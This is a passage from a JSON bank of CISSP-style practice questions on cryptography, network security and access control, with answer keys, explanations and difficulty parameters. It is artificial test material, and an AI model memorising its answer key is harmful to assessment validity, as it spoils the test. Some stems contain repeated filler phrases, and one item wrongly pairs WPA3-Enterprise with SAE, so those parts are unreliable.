      "explanation": "Correct Answer: The internal root CA is not in external partners' trust stores. Browsers trust certificates by tracing the chain to a root CA they already have installed. Internal CAs are not included in public browser trust stores (OS/browser root certificate programs), so any certificate they sign will appear untrusted to external users. The fix is either distributing the internal root CA certificate to partner endpoints (feasible for managed partners) or using a publicly trusted CA for externally-facing services. CN/SAN mismatch, TLS version, and CRL reachability are common issues but would typically produce different, more specific error messages."
    },
    {
      "id": "d3-q5",
      "domain": "3 Security Architecture and Engineering",
      "stem": "A security architect needs to choose an encryption algorithm for bulk data encryption of files at rest. Performance is critical as the system encrypts terabytes of data daily. Which type of encryption is MOST appropriate?",
      "choices": [
        "Asymmetric encryption (e.g., RSA-4096)",
        "Hashing using SHA-256",
        "Hybrid encryption using RSA for key exchange and AES for data",
        "Symmetric encryption (e.g., AES-256)"
      ],
      "correctIndex": 3,
      "difficulty": -0.7,
      "discrimination": 1.0,
      "explanation": "Correct Answer: Symmetric encryption (e.g., AES-256). Symmetric encryption uses a single shared key and is orders of magnitude faster than asymmetric encryption, making it suitable for bulk data encryption. RSA-4096 is too computationally expensive for bulk encryption. Hybrid encryption is appropriate for key exchange scenarios, not pure storage encryption. SHA-256 is a hash function, not an encryption algorithm — it is one-way and does not allow decryption."
    },
    {
      "id": "d3-q6",
      "domain": "3 Security Architecture and Engineering",
      "stem": "An organization wants to verify that a 500MB software update package has not been altered during download. Which cryptographic technique should be used?",
      "choices": [
        "Symmetric encryption — encrypt the package before distribution",
        "Digital signature — sign the hash with the distributor's private key",
        "HMAC — apply a keyed hash using a shared secret",
        "Hashing — compute a message digest and compare with the published hash"
      ],
      "correctIndex": 1,
      "difficulty": 0.6,
      "discrimination": 1.2,
      "explanation": "Correct Answer: Digital signature — sign the hash with the distributor's private key. A digital signature provides both integrity (the hash detects modifications) and authentication (the private key proves the signer's identity), which together confirm the package is unaltered and from the legitimate publisher. Simple hashing verifies integrity but not the source (the hash itself could be replaced). Symmetric encryption provides confidentiality, not integrity verification. HMAC requires a shared secret, which doesn't scale to public distribution."
    },
    {
      "id": "d3-q7",
      "domain": "3 Security Architecture and Engineering",
      "stem": "The Trusted Computing Base (TCB) of an operating system is described as the combination of hardware, software, and firmware that enforces the security policy. What is the PRIMARY concern if a vulnerability is found within the TCB?",
      "choices": [
        "The vulnerability would only impact user-space applications",
        "The entire security policy enforcement mechanism could be compromised",
        "The system's network perimeter would be exposed",
        "Only confidentiality controls would be affected"
      ],
      "correctIndex": 1,
      "difficulty": 0.8,
      "discrimination": 1.15,
      "explanation": "Correct Answer: The entire security policy enforcement mechanism could be compromised. The TCB is the totality of protection mechanisms — if it is compromised, all security guarantees provided by the operating system are potentially void because all access control decisions flow through the TCB. It is not limited to confidentiality — integrity and availability are equally affected. User-space applications rely on the TCB but a TCB vulnerability affects the kernel/firmware layer. Network perimeter is a separate architectural component."
    },
    {
      "id": "d3-q8",
      "domain": "3 Security Architecture and Engineering",
      "stem": "A government agency requires that a commercial security product be formally evaluated and achieve a level confirming that the security functions have been methodically tested and checked. Which Common Criteria Evaluation Assurance Level (EAL) represents this requirement?",
      "choices": [
        "EAL7 — Formally verified design and tested",
        "EAL3 — Methodically tested and checked",
        "EAL1 — Functionally tested",
        "EAL5 — Semiformally designed and tested"
      ],
      "correctIndex": 1,
      "difficulty": 1.1,
      "discrimination": 1.2,
      "explanation": "Correct Answer: EAL3 — Methodically tested and checked. EAL3 provides assurance that security functions have been methodically tested and checked through developer testing, selective independent testing, and a search for obvious vulnerabilities. EAL1 provides only basic functional testing. EAL5 requires semiformal design documentation. EAL7 is the highest level, requiring formal mathematical verification — used only for highly critical systems."
    },
    {
      "id": "d3-q9",
      "domain": "3 Security Architecture and Engineering",
      "stem": "A data center is designing physical security zones. The server room containing production systems should be classified as which type of zone requiring the STRONGEST access controls?",
      "choices": [
        "Public zone with visitor logging",
        "Controlled zone with badge access only",
        "Operations zone with shared key access",
        "Restricted zone with multi-factor physical access control and logging"
      ],
      "correctIndex": 3,
      "difficulty": -0.3,
      "discrimination": 1.0,
      "explanation": "Correct Answer: Restricted zone with multi-factor physical access control and logging. Production server rooms are classified as restricted areas requiring the highest physical protection: MFA (e.g., badge + PIN or biometric), full access logging, mantrap/airlock entry, and security monitoring. A controlled zone with badge-only access is insufficient. Public zones allow visitor access. Shared key access provides no individual accountability."
    },
    {
      "id": "d3-q10",
      "domain": "3 Security Architecture and Engineering",
      "stem": "A facilities security manager is a facilities security manager. The data center uses a Halon 1301 replacement suppression system. During a drill, an employee notices the system activates before visible flames appear. Which type of fire detection triggered the suppression?",
      "choices": [
        "Ionization smoke detection",
        "Incipient (aspirating) smoke detection",
        "Rate-of-rise heat detection",
        "Fixed-temperature heat detection"
      ],
      "correctIndex": 1,
      "difficulty": 0.6,
      "discrimination": 1.1,
      "explanation": "Correct Answer: Incipient (aspirating) smoke detection. Aspirating (VESDA-type) detectors sample air continuously and detect combustion byproducts at the earliest pre-smoke stage, before visible smoke or flames — allowing suppression activation before a fire develops. Rate-of-rise detects rapid temperature changes but not pre-combustion conditions. Ionization detectors sense smoke particles in the air. Fixed-temperature detectors activate at a set temperature, well after fire has developed."
    },
    {
      "id": "d3-q11",
      "domain": "3 Security Architecture and Engineering",
      "stem": "A cloud security architect is a security architect applying PASTA (Process for Attack Simulation and Threat Analysis) to a new cloud-based payment system. In which PASTA stage does the architect enumerate and score specific threats based on attacker capability and motivation?",
      "choices": [
        "Stage 3 — Application Decomposition and Analysis",
        "Stage 7 — Risk and Impact Analysis",
        "Stage 5 — Vulnerability and Weaknesses Analysis mapped to enumerated threats",
        "Stage 2 — Define the Technical Scope of the assessment"
      ],
      "correctIndex": 2,
      "difficulty": 1.0,
      "discrimination": 1.2,
      "explanation": "Correct Answer: Stage 5 — Vulnerability and Weaknesses Analysis mapped to enumerated threats. In PASTA's seven stages, Stage 5 involves mapping identified vulnerabilities to threats that were enumerated in Stage 4 (Threat Analysis). This is where threat scoring based on attacker capability, motivation, and vulnerability occurs. Stage 2 defines technical boundaries. Stage 3 decomposes application components. Stage 7 produces the final risk and business impact summary."
    },
    {
      "id": "d3-q12",
      "domain": "3 Security Architecture and Engineering",
      "stem": "A security architect is designing a system where no single control failure should result in a complete compromise. Which design principle BEST describes this layered approach?",
      "choices": [
        "Fail-secure",
        "Least privilege",
        "Defense in depth",
        "Separation of duties"
      ],
      "correctIndex": 2,
      "difficulty": -0.5,
      "discrimination": 1.0,
      "explanation": "Correct Answer: Defense in depth. Defense in depth applies multiple, overlapping security controls at different layers (network, host, application, data) so that the failure of any single control does not result in full compromise. Least privilege limits access rights but is one control layer, not the multi-layered philosophy. Fail-secure ensures systems default to a secure state on failure. Separation of duties divides responsibilities to prevent fraud."
    },
    {
      "id": "d3-q13",
      "domain": "3 Security Architecture and Engineering",
      "stem": "A cloud security review finds that a company's Restricted-classified financial processing workloads share a bare-metal hypervisor host with three other tenants' workloads in a co-located data center. The security team is documenting risks for the CISO. What is the PRIMARY risk the security team should document, and which control MOST directly mitigates it?",
      "choices": [
        "A compromised co-tenant VM could exploit a hypervisor vulnerability to access the financial workload's memory or storage — mitigated by isolating Restricted workloads to dedicated physical hosts with no shared hypervisor",
        "Co-location increases network latency, which could delay security monitoring alerts — mitigated by deploying a dedicated network tap on the shared segment",
        "The shared hypervisor's administrative interface could be accessed by any tenant — mitigated by requiring separate admin credentials per tenant",
        "Shared physical infrastructure violates PCI DSS by default — the only remediation is moving to a dedicated private cloud"
      ],
      "correctIndex": 0,
      "difficulty": 0.5,
      "discrimination": 1.1,
      "explanation": "Correct Answer: VM escape / hypervisor breakout risk — isolation on dedicated physical hosts. When VMs share a hypervisor, a vulnerability in the hypervisor layer could allow a malicious or compromised VM to break isolation and access adjacent VM memory, disk, or network traffic. For Restricted-classified data, the control is dedicated physical hosts with no tenant co-mingling. Latency is an operational concern, not a security risk. Tenant admin credential separation addresses management plane access, not hypervisor isolation. PCI DSS doesn't prohibit shared infrastructure when proper isolation controls are implemented."
    },
    {
      "id": "d3-q14",
      "domain": "3 Security Architecture and Engineering",
      "stem": "A system classified at Secret allows a process running at the Secret level to write data to a storage channel that is also accessible by a process running at the Unclassified level, without using any standard inter-process communication mechanism. What type of attack channel does this represent?",
      "choices": [
        "Side-channel attack",
        "Storage covert channel",
        "Overt channel",
        "Timing covert channel"
      ],
      "correctIndex": 1,
      "difficulty": 1.2,
      "discrimination": 1.25,
      "explanation": "Correct Answer: Storage covert channel. A storage covert channel communicates information by modifying a shared storage resource (file, registry key, disk space, etc.) that can be observed by a receiver at a different security level — bypassing the security policy. A timing covert channel communicates through the timing of operations rather than stored values. An overt channel is an authorized communication path. A side-channel attack exploits physical or implementation characteristics (power, timing, emissions) rather than logical storage."
    },
    {
      "id": "d3-q15",
      "domain": "3 Security Architecture and Engineering",
      "stem": "A hardware security module vendor discovers that their device leaks exploitable information through measurable power fluctuations during AES encryption operations. An academic researcher demonstrates full private key recovery using statistical analysis of power traces collected across thousands of encryption cycles on the same device. Which countermeasures should the vendor implement to address THIS specific attack class?",
      "choices": [
        "Power consumption randomization, constant-time execution paths, and hardware noise injection — eliminating the statistical correlation between cryptographic operations and power draw",
        "Increase the AES key length from 128 to 256 bits to raise the computational cost of key recovery",
        "Add rate limiting on the encryption API to prevent an attacker from collecting enough power traces for statistical analysis",
        "Implement input validation on the encryption module to reject malformed or repeated plaintext inputs"
      ],
      "correctIndex": 0,
      "difficulty": 1.7,
      "discrimination": 1.3,
      "explanation": "Correct Answer: Power randomization, constant-time execution, and hardware noise injection. This is a Differential Power Analysis (DPA) side-channel attack — the key is recovered by correlating power consumption patterns with cryptographic operations. Countermeasures must eliminate or obscure the correlation: randomizing power draw, ensuring all code paths take equal time, and adding hardware-level noise. Larger key sizes don't address physical leakage — DPA bypasses cryptographic strength by exploiting implementation characteristics. Rate limiting helps somewhat against trace collection but doesn't eliminate the fundamental leakage. Input validation has no effect on power analysis attacks that use legitimate inputs."
    },
    {
      "id": "d3-q16",
      "domain": "3 Security Architecture and Engineering",
      "stem": "An organization's PKI policy requires that private keys for root Certificate Authorities be generated and stored in tamper-resistant hardware that prevents key extraction. Which device is specifically designed for this purpose?",
      "choices": [
        "Hardware Security Module (HSM)",
        "Trusted Platform Module (TPM)",
        "Key Management Interoperability Protocol (KMIP) server",
        "Smart card"
      ],
      "correctIndex": 0,
      "difficulty": 0.9,
      "discrimination": 1.15,
      "explanation": "Correct Answer: Hardware Security Module (HSM). An HSM is a dedicated, tamper-resistant hardware device designed to generate, store, and protect cryptographic keys and perform cryptographic operations. Root CA keys are required to be stored in HSMs under most PKI policies and standards (e.g., WebTrust). A TPM is a chip embedded in hardware for platform integrity measurement, not general-purpose key management. Smart cards store individual user keys in limited capacity. KMIP is a key management protocol, not a storage device."
    },
    {
      "id": "d4-q1",
      "domain": "4 Communication and Network Security",
      "stem": "A network analyst is troubleshooting a connectivity issue. She identifies the problem at the layer responsible for logical addressing and routing decisions. Which OSI model layer is she working at?",
      "choices": [
        "Layer 4 — Transport layer",
        "Layer 3 — Network layer",
        "Layer 7 — Application layer",
        "Layer 2 — Data Link layer"
      ],
      "correctIndex": 1,
      "difficulty": -0.8,
      "discrimination": 0.95,
      "explanation": "Correct Answer: Layer 3 — Network layer. The Network layer (Layer 3) handles logical addressing (IP addresses) and routing — determining the best path for packets across networks. Layer 2 (Data Link) handles physical MAC addressing and frame transmission. Layer 4 (Transport) manages end-to-end communication, error recovery, and port numbers. Layer 7 (Application) provides network services to user applications."
    },
    {
      "id": "d4-q2",
      "domain": "4 Communication and Network Security",
      "stem": "A security engineer needs to allow web traffic inbound to a DMZ web server but block all traffic from the DMZ from initiating connections into the internal network. Which firewall type BEST enforces this stateful requirement?",
      "choices": [
        "Packet filtering firewall",
        "Application-layer proxy firewall",
        "Circuit-level gateway",
        "Stateful inspection firewall"
      ],
      "correctIndex": 3,
      "difficulty": 0.1,
      "discrimination": 1.05,
      "explanation": "Correct Answer: Stateful inspection firewall. A stateful inspection firewall tracks the state of network connections and can distinguish between established sessions initiated from the internal network and new connection attempts from the DMZ, enforcing asymmetric access rules. A packet filtering firewall inspects individual packets without connection state — it cannot reliably block DMZ-initiated connections while allowing inbound web responses. An application-layer proxy is more capable but the question focuses on stateful connection tracking. A circuit-level gateway validates the TCP handshake but doesn't track application-layer state."
    },
    {
      "id": "d4-q3",
      "domain": "4 Communication and Network Security",
      "stem": "A SOC team is deploying network monitoring for a sensitive financial processing segment. The security architect wants full visibility into attack patterns targeting the segment but is concerned that automated inline blocking could disrupt time-critical transaction processing during the initial tuning period. Which deployment model BEST satisfies both requirements?",
      "choices": [
        "A network-based monitoring sensor in passive tap mode that generates alerts on detected signatures without any inline traffic enforcement — blocking can be added after tuning is complete",
        "An inline network-based prevention system in blocking mode to immediately stop detected attacks and protect the segment from the start",
        "A stateful perimeter firewall with deny-by-default rules, which provides both visibility and blocking without signature-based false positive risk",
        "A web application firewall placed in front of the segment's transaction processing interfaces in blocking mode"
      ],
      "correctIndex": 0,
      "difficulty": -0.6,
      "discrimination": 1.0,
      "explanation": "Correct Answer: Passive monitoring sensor (IDS mode) without inline enforcement. This provides full signature-based visibility without the risk of incorrectly blocking legitimate transaction traffic during tuning. An inline prevention system (IPS) in blocking mode risks disrupting time-critical processing if signatures are not yet tuned for this environment's baseline. A stateful firewall operates on IP/port rules, not application-layer attack signatures — it doesn't provide the same detection visibility. A WAF addresses web application attacks, not broader network-layer threats, and blocking mode still carries the same tuning risk."
    },
    {
      "id": "d4-q4",
      "domain": "4 Communication and Network Security",
      "stem": "A corporation requires secure remote access for employees connecting from home to internal systems. The solution must ensure that all traffic between the employee's device and the corporate network is encrypted, regardless of the application used. Which VPN approach BEST satisfies this?",
      "choices": [
        "SSH port forwarding",
        "Full-tunnel VPN using IPsec",
        "Split-tunnel VPN using SSL/TLS",
        "Clientless SSL VPN portal"
      ],
      "correctIndex": 1,
      "difficulty": 0.3,
      "discrimination": 1.1,
      "explanation": "Correct Answer: Full-tunnel VPN using IPsec. A full-tunnel VPN routes ALL traffic from the endpoint through the encrypted tunnel to corporate, regardless of destination — ensuring no traffic bypasses security controls. Split-tunnel VPN only routes corporate-bound traffic through the tunnel; internet traffic goes direct. Clientless SSL VPN provides web-based access to specific applications, not all traffic. SSH port forwarding is limited to specific ports and applications."
    },
    {
      "id": "d4-q5",
      "domain": "4 Communication and Network Security",
      "stem": "During a TLS 1.3 handshake, the client sends a 'ClientHello' message. What does the server's NEXT response accomplish?",
      "choices": [
        "The server sends its public key for the client to encrypt a pre-master secret",
        "The server sends a Certificate Revocation List (CRL) for client validation",
        "The server sends ServerHello, selects cipher suite, and begins key agreement in the same message round",
        "The server requests the client's certificate for mutual authentication"
      ],
      "correctIndex": 2,
      "difficulty": 1.0,
      "discrimination": 1.2,
      "explanation": "Correct Answer: The server sends ServerHello, selects cipher suite, and begins key agreement in the same message round. TLS 1.3 streamlined the handshake — the server's ServerHello includes its key share and the cipher suite selection, reducing round trips compared to TLS 1.2. Client certificate requests are optional and happen separately. TLS 1.3 eliminated RSA key transport (the pre-master secret model); key agreement uses Diffie-Hellman exclusively. CRL checking is a separate validation step, not part of the ServerHello."
    },
    {
      "id": "d4-q6",
      "domain": "4 Communication and Network Security",
      "stem": "A company deploys Wi-Fi across its corporate campus. The security team mandates the strongest available wireless security protocol to protect against offline dictionary attacks on captured handshakes. Which protocol should be selected?",
      "choices": [
        "WPA2-Personal with AES-CCMP",
        "WPA2-Enterprise with PEAP-MSCHAPv2",
        "WPA-Personal with TKIP",
        "WPA3-Enterprise with SAE (Simultaneous Authentication of Equals)"
      ],
      "correctIndex": 3,
      "difficulty": 0.4,
      "discrimination": 1.1,
      "explanation": "Correct Answer: WPA3-Enterprise with SAE (Simultaneous Authentication of Equals). WPA3 uses SAE (Dragonfly handshake) which provides forward secrecy and eliminates the vulnerability to offline dictionary attacks against captured 4-way handshakes present in WPA2-PSK. WPA2-Personal with AES is secure but vulnerable to offline PMKID/handshake attacks. WPA2-Enterprise with PEAP protects credentials but uses the older WPA2 framework. WPA with TKIP is deprecated and vulnerable."
    },
    {
      "id": "d4-q7",
      "domain": "4 Communication and Network Security",
      "stem": "A network engineer segments the corporate network into separate zones for finance, HR, development, and guest wireless, with access between segments controlled by firewall rules. What security principle does this MOST directly implement?",
      "choices": [
        "Defense in depth — layering multiple security controls",
        "Zero trust — verifying every access request regardless of location",
        "Network segmentation — reducing blast radius through zone isolation",
        "Least privilege — limiting access rights to minimum necessary"
      ],
      "correctIndex": 2,
      "difficulty": 0.2,
      "discrimination": 1.0,
      "explanation": "Correct Answer: Network segmentation — reducing blast radius through zone isolation. Network segmentation divides the network into zones and controls traffic between them, directly limiting the spread of attacks (blast radius containment). Defense in depth is broader and includes multiple control types. Least privilege applies to user/system permissions, not network architecture. Zero trust is an architectural model that includes but goes beyond segmentation."
    },
    {
      "id": "d4-q8",
      "domain": "4 Communication and Network Security",
      "stem": "A cloud-native organization adopts a zero trust architecture. An employee accesses a critical application from an approved corporate device, but the connection originates from an unusual geographic location at 3 AM. Under zero trust, what should happen?",
      "choices": [
        "Step-up authentication is triggered and the session undergoes additional verification before access is granted",
        "Access is automatically approved because the device is corporate-managed",
        "The connection is allowed because the user's identity was verified at login",
        "The user is blocked permanently until IT reviews the request"
      ],
      "correctIndex": 0,
      "difficulty": 0.8,
      "discrimination": 1.2,
      "explanation": "Correct Answer: Step-up authentication is triggered and the session undergoes additional verification before access is granted. Zero trust operates on 'never trust, always verify' — continuous risk evaluation means unusual context (location, time) triggers step-up authentication (additional MFA challenge) rather than blanket approval or denial. Trusting based solely on device management violates zero trust principles. Permanent blocking is too disruptive and defeats the policy-based model. Initial login verification does not satisfy zero trust's continuous verification requirement."
    },
    {
      "id": "d4-q9",
      "domain": "4 Communication and Network Security",
      "stem": "An attacker intercepts DNS responses and substitutes malicious IP addresses, redirecting users to fraudulent websites despite correct URL entry. Which DNS security technology is designed to prevent this attack?",
      "choices": [
        "Split-horizon DNS — returns different results based on query source",
        "DNSSEC — cryptographically signs DNS records to enable validation",
        "DNS over HTTPS (DoH) — encrypts DNS queries between client and resolver",
        "DNS sinkholing — redirects malicious domain queries to a controlled server"
      ],
      "correctIndex": 1,
      "difficulty": 0.9,
      "discrimination": 1.15,
      "explanation": "Correct Answer: DNSSEC — cryptographically signs DNS records to enable validation. DNSSEC adds digital signatures to DNS records, allowing resolvers to verify that responses are authentic and have not been tampered with — directly preventing DNS cache poisoning and response manipulation. DoH encrypts the transport channel but doesn't authenticate record content. Split-horizon DNS serves different records to internal/external users, not a security validation mechanism. DNS sinkholing redirects known-malicious queries but doesn't prevent injection attacks."
    },
    {
      "id": "d4-q10",
      "domain": "4 Communication and Network Security",
      "stem": "A retail chain is migrating from MPLS to an SD-WAN solution across 200 branch locations. The security team is concerned about the increased attack surface. What is the MOST critical security control to implement in an SD-WAN deployment?",
      "choices": [
        "Implementing MPLS as a backup circuit for all sites",
        "Deploying physical firewalls at every branch location",
        "Requiring VPN clients on all branch employee devices",
        "Centralized policy enforcement with encrypted overlay tunnels between all sites"
      ],
      "correctIndex": 3,
      "difficulty": 0.7,
      "discrimination": 1.1,
      "explanation": "Correct Answer: Centralized policy enforcement with encrypted overlay tunnels between all sites. SD-WAN uses internet connectivity (which is untrusted), making encrypted overlays (IPsec tunnels) and centralized security policy management essential for maintaining consistent protection across all sites. Physical firewalls at 200 branches are operationally expensive and inconsistent without central management. MPLS backup is a resilience measure, not a security control. VPN clients on devices address endpoint connectivity, not branch-to-branch traffic security."
    },
    {
      "id": "d4-q11",
      "domain": "4 Communication and Network Security",
      "stem": "A financial services company implements microsegmentation in their data center. Workloads are isolated at the individual virtual machine level with policy enforced at each workload's virtual network interface. What attack scenario does this MOST directly mitigate?",
      "choices": [
        "Man-in-the-middle attacks on external API calls",
        "Distributed denial-of-service (DDoS) amplification attacks",
        "East-west (lateral) movement following an initial compromise",
        "North-south (perimeter) intrusion from external threats"
      ],
      "correctIndex": 2,
      "difficulty": 1.0,
      "discrimination": 1.2,
      "explanation": "Correct Answer: East-west (lateral) movement following an initial compromise. Microsegmentation applies fine-grained access controls at the workload level, preventing a compromised VM from communicating freely with other internal systems. This directly limits lateral movement — the hallmark of advanced persistent threats. North-south traffic (perimeter) is controlled by perimeter firewalls. DDoS mitigation requires traffic scrubbing services. MitM on external APIs requires certificate validation and transport encryption."
    },
    {
      "id": "d4-q12",
      "domain": "4 Communication and Network Security",
      "stem": "During a forensic investigation, a network analyst captures full packet data from a suspected data exfiltration event. The data is encrypted. She analyzes traffic volume, timing, and destination IP patterns without decrypting content. What analysis technique is she using?",
      "choices": [
        "Deep packet inspection (DPI)",
        "SSL/TLS interception and decryption",
        "Signature-based intrusion detection",
        "Network traffic metadata and flow analysis"
      ],
      "correctIndex": 3,
      "difficulty": 0.5,
      "discrimination": 1.1,
      "explanation": "Correct Answer: Network traffic metadata and flow analysis. Analyzing volume, timing, packet size distributions, and communication patterns without inspecting payload content is NetFlow/metadata analysis. This technique reveals behavioral anomalies even in encrypted traffic. Deep packet inspection requires examining payload content. SSL/TLS interception requires decryption. Signature-based IDS requires matching known patterns in packet content."
    },
    {
      "id": "d4-q13",
      "domain": "4 Communication and Network Security",
      "stem": "An organization migrates from IPv4 to a dual-stack IPv4/IPv6 environment. The security team discovers that IPv6 is enabled on all internal hosts by default but no firewall rules have been written for IPv6 traffic. What is the MOST significant security concern?",
      "choices": [
        "IPv6 traffic may bypass IPv4-based firewall rules entirely, creating unmonitored attack paths",
        "IPv6 does not support IPsec, reducing encryption options",
        "IPv6 introduces link-local addresses that conflict with DHCP assignments",
        "IPv6 addresses are longer and therefore harder to manage in ACLs"
      ],
      "correctIndex": 0,
      "difficulty": 0.9,
      "discrimination": 1.2,
      "explanation": "Correct Answer: IPv6 traffic may bypass IPv4-based firewall rules entirely, creating unmonitored attack paths. Many firewalls are configured only for IPv4 rules; when IPv6 is enabled on hosts, that traffic flows through the network unfiltered. Attackers can use IPv6 to tunnel traffic or communicate in ways that bypass perimeter controls. ACL complexity is a management concern, not a primary security risk. IPv6 actually mandates IPsec support (though not enforcement). Link-local addresses don't conflict with DHCP; they're self-configured and non-routable."
    },
    {
      "id": "d4-q14",
      "domain": "4 Communication and Network Security",
      "stem": "An attacker connects to a trunk port on a managed switch, sends frames with double-encapsulated 802.1Q VLAN tags, and gains access to traffic on a different VLAN. What attack is being performed and what is the PRIMARY countermeasure?",
      "choices": [
        "MAC flooding; mitigated by port security with MAC address limits",
        "VLAN hopping via double-tagging; mitigated by disabling native VLAN on trunk ports",
        "Spanning tree attack; mitigated by enabling BPDU guard on access ports",
        "ARP poisoning; mitigated by enabling dynamic ARP inspection"
      ],
      "correctIndex": 1,
      "difficulty": 0.9,
      "discrimination": 1.2,
      "explanation": "Correct Answer: VLAN hopping via double-tagging; mitigated by disabling native VLAN on trunk ports. Double-tagging VLAN hopping works by sending frames with two 802.1Q tags — the outer tag matches the native VLAN of the trunk, which is stripped by the first switch; the inner tag then directs the frame to the target VLAN. Disabling the native VLAN (or setting it to an unused VLAN) on trunk ports prevents this. ARP poisoning is a separate Layer 2 attack. MAC flooding overwhelms the CAM table. Spanning tree attacks manipulate root bridge election."
    },
    {
      "id": "d4-q15",
      "domain": "4 Communication and Network Security",
      "stem": "A reverse proxy is placed in front of an organization's web servers. Which security capability does a reverse proxy provide that a standard forward proxy does NOT?",
      "choices": [
        "Allowing internal users to anonymously browse the internet",
        "Enforcing outbound content filtering for user web traffic",
        "Providing split tunneling for remote VPN users",
        "Protecting internal server identities and filtering inbound requests to backend servers"
      ],
      "correctIndex": 3,
      "difficulty": 0.4,
      "discrimination": 1.05,
      "explanation": "Correct Answer: Protecting internal server identities and filtering inbound requests to backend servers. A reverse proxy sits in front of servers, hiding their real IP addresses, terminating external connections, and inspecting/filtering inbound requests — protecting backend infrastructure. A forward proxy serves internal users making outbound requests to the internet, providing anonymization and outbound filtering. VPN split tunneling is a network architecture concept unrelated to proxy function."
    },
    {
      "id": "d4-q16",
      "domain": "4 Communication and Network Security",
      "stem": "A company moves its primary application to a public cloud provider. The security architect must ensure that traffic between cloud-hosted microservices cannot be sniffed by other tenants. What is the MOST appropriate control?",
      "choices": [
        "Enabling cloud provider's default encryption at rest for all services",
        "Deploying a hardware firewall appliance in the cloud region",
        "Service mesh with mutual TLS (mTLS) encryption between all microservices",
        "Virtual Private Cloud (VPC) isolation with security group rules"
      ],
      "correctIndex": 2,
      "difficulty": 0.7,
      "discrimination": 1.15,
      "explanation": "Correct Answer: Service mesh with mutual TLS (mTLS) encryption between all microservices. mTLS encrypts traffic between services AND provides mutual authentication, ensuring that even if network isolation is compromised, traffic cannot be intercepted or injected. VPC isolation and security groups control network access but don't encrypt inter-service traffic. Hardware firewalls in cloud environments manage traffic flows but don't encrypt East-West microservice communication. Encryption at rest protects stored data, not in-transit communication between services."
    },
    {
      "id": "d5-q1",
      "domain": "5 Identity and Access Management",
      "stem": "A company's login system requires a username/password plus a one-time code sent to a registered mobile phone number. Which authentication category does the mobile code represent?",
      "choices": [
        "Something you have",
        "Somewhere you are",
        "Something you are",
        "Something you know"
      ],
      "correctIndex": 0,
      "difficulty": -0.9,
      "discrimination": 0.95,
      "explanation": "Correct Answer: Something you have. The registered mobile phone is a possession factor — something you have. The password is something you know. Biometrics (fingerprint, face scan) represent something you are. Location-based authentication is somewhere you are. A one-time code sent to a phone number requires possession of that phone, making it a possession factor."
    },
    {
      "id": "d5-q2",
      "domain": "5 Identity and Access Management",
      "stem": "An organization issues hardware security keys (FIDO2 tokens) to all privileged administrators. When an admin attempts to log in from a new workstation, they insert the key and tap a button. Why does this method provide stronger phishing resistance than TOTP-based MFA?",
      "choices": [
        "FIDO2 hardware keys perform origin-bound authentication — the credential is cryptographically tied to the specific website domain",
        "Hardware keys do not require network connectivity to function",
        "Hardware keys generate longer one-time passwords that are harder to intercept",
        "TOTP codes expire faster than FIDO2 tokens making TOTP less secure"
      ],
      "correctIndex": 0,
      "difficulty": 1.1,
      "discrimination": 1.25,
      "explanation": "Correct Answer: FIDO2 hardware keys perform origin-bound authentication — the credential is cryptographically tied to the specific website domain. FIDO2/WebAuthn binds credentials to the relying party's origin (domain); even if a user is tricked to a phishing site, the key will not authenticate to a different domain. TOTP codes are numeric and can be captured by a real-time phishing proxy. OTP length doesn't determine phishing resistance. Offline capability is a usability advantage, not the security differentiator."
    },
    {
      "id": "d5-q3",
      "domain": "5 Identity and Access Management",
      "stem": "An access control audit at a healthcare organization reveals that individual clinicians accumulate ad hoc permission grants over time, creating overprovisioned accounts that persist after role changes. The CISO wants to implement a model where: permissions are assigned to job functions (not individuals), a user's access changes automatically when their job function changes, and one-off individual grants outside the job-function model are prohibited. Which access control model BEST meets all three requirements?",
      "choices": [
        "A job-function-centric model where permissions are defined per role, users are assigned to roles, and access is inherited — no individual grants permitted outside the role structure",
        "A model where each resource owner grants access to individuals based on their own judgment, reviewed annually",
        "A policy engine that evaluates user attributes (location, department, time of day) dynamically at each access request",
        "A mandatory classification model where security labels assigned by a central authority determine read and write access"
      ],
      "correctIndex": 0,
      "difficulty": -0.5,
      "discrimination": 1.0,
      "explanation": "Correct Answer: A job-function-centric (role-based) model. Role-Based Access Control (RBAC) assigns permissions to roles that map to job functions. Users inherit access by role assignment — when a clinician changes roles, their access changes accordingly. Prohibiting individual grants outside roles prevents the accumulation pattern that caused the audit finding. Owner-discretion models (DAC) allow the individual grants that created the problem. Attribute-based policy engines are flexible but require significant policy engineering and don't naturally enforce the 'no individual grants' requirement. Classification-based mandatory access control is designed for confidentiality enforcement in classified environments, not healthcare job-function access management."
    },
    {
      "id": "d5-q4",
      "domain": "5 Identity and Access Management",
      "stem": "A military system classifies users and files with sensitivity labels (Top Secret, Secret, Confidential). The operating system enforces access based on label comparisons, and users cannot override these rules. This is an example of which access control model?",
      "choices": [
        "Discretionary Access Control (DAC)",
        "Mandatory Access Control (MAC)",
        "Role-Based Access Control (RBAC)",
        "Rule-Based Access Control"
      ],
      "correctIndex": 1,
      "difficulty": -0.4,
      "discrimination": 1.0,
      "explanation": "Correct Answer: Mandatory Access Control (MAC). MAC enforces access decisions based on classification labels assigned to subjects and objects, and these decisions are made by the system — not by the users or resource owners. Users cannot override MAC policy. RBAC uses roles. DAC allows owners to set permissions. Rule-Based Access Control enforces rules like firewall ACLs but isn't label-based."
    },
    {
      "id": "d5-q5",
      "domain": "5 Identity and Access Management",
      "stem": "A post-breach investigation finds that three former employees retained read access to sensitive project files on a file server for 6 months after their termination. Investigation reveals the file server grants each file owner full control over who can access their files, with no central policy enforcement overriding owner decisions. When owners themselves leave, their access grants persist until manually reviewed. What is the PRIMARY architectural risk this model creates, and which change would MOST directly address it?",
      "choices": [
        "Owner-managed permissions have no central revocation mechanism — access persists when owners are unavailable; implementing centrally enforced lifecycle policies that revoke access automatically on offboarding eliminates this gap",
        "The model allows too many users to have write access — restricting all users to read-only access would prevent unauthorized modification",
        "File server permissions are too granular — consolidating all files into a single shared folder with uniform access would simplify management",
        "The model lacks encryption — encrypting files at rest would prevent terminated employees from reading files even if access persists"
      ],
      "correctIndex": 0,
      "difficulty": -0.5,
      "discrimination": 1.0,
      "explanation": "Correct Answer: Owner-managed access (Discretionary Access Control) creates orphaned permissions when owners leave. The fix is centrally enforced lifecycle management tied to HR offboarding. DAC is flexible but places the entire access governance burden on individual owners — when they leave, their grants have no automatic expiry. Restricting to read-only doesn't address the persistence problem for former employees. Consolidating into a single shared folder with uniform access would over-grant access to everyone. Encryption at rest protects against physical media theft, not authenticated access by former employees who still have valid accounts."
    },
    {
      "id": "d5-q6",
      "domain": "5 Identity and Access Management",
